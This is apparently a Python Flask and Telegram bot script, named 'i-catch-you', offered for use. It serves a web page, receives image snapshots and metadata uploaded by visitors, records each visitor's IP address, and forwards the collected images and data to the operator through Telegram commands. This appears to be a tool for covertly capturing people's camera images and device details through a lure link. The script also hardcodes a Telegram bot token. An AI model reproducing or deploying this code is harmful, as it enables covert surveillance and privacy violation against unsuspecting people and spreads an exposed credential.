import os, json, threading
from flask import Flask, request, send_from_directory
from telegram.ext import ApplicationBuilder, CommandHandler
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
for folder in ["images", "metadata", "sent"]:
    os.makedirs(os.path.join(BASE_DIR, folder), exist_ok=True)

# متغير التحكم في الحالة
is_running = False
app = Flask(__name__)

@app.route('/', methods=['GET'])
def index(): return send_from_directory(BASE_DIR, 'index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if not is_running: return 'Server stopped', 503
    image = request.files.get('image')
    metadata = request.form.get('metadata')
    if image:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        image.save(os.path.join(BASE_DIR, "images", f'snapshot_{ts}.png'))
        with open(os.path.join(BASE_DIR, "metadata", 'latest.json'), 'w') as f:
            json.dump({'client_ip': request.remote_addr, 'data': json.loads(metadata) if metadata else {}}, f)
        return 'Uploaded', 200
    return 'No image', 400

def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
threading.Thread(target=run_flask, daemon=True).start()

# أوامر البوت
async def start(u, c):
    global is_running
    is_running = True
    await u.message.reply_text("✅ Server Started!\n🌍 Link: https://i-catch-you-bot.onrender.com/")

async def stop(u, c):
    global is_running
    is_running = False
    await u.message.reply_text("Server stopped ⛔")

async def status(u, c):
    msg = "Server online 🟢" if is_running else "Server offline 🔴"
    await u.message.reply_text(msg)

async def infos(u, c):
    path = os.path.join(BASE_DIR, "metadata", 'latest.json')
    if os.path.exists(path):
        with open(path, 'r') as f: await u.message.reply_text(f.read())
    else: await u.message.reply_text("No infos found")

async def images(u, c):
    img_dir = os.path.join(BASE_DIR, "images")
    files = [f for f in os.listdir(img_dir) if f.lower().endswith((".jpg", ".png"))]
    if not files: await u.message.reply_text("No images found ⚠️"); return
    await u.message.reply_text(f"{len(files)} images found")
    for f in files:
        with open(os.path.join(img_dir, f), "rb") as img: await u.message.reply_photo(photo=img)
        os.replace(os.path.join(img_dir, f), os.path.join(BASE_DIR, "sent", f))

if __name__ == '__main__':
    bot_app = ApplicationBuilder().token("8612074749:AAHGvzF43cf5AkwzGhEDJHgvwNRF2KaO2qg").build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("stop", stop))
    bot_app.add_handler(CommandHandler("status", status))
    bot_app.add_handler(CommandHandler("infos", infos))
    bot_app.add_handler(CommandHandler("images", images))
    bot_app.run_polling()
    
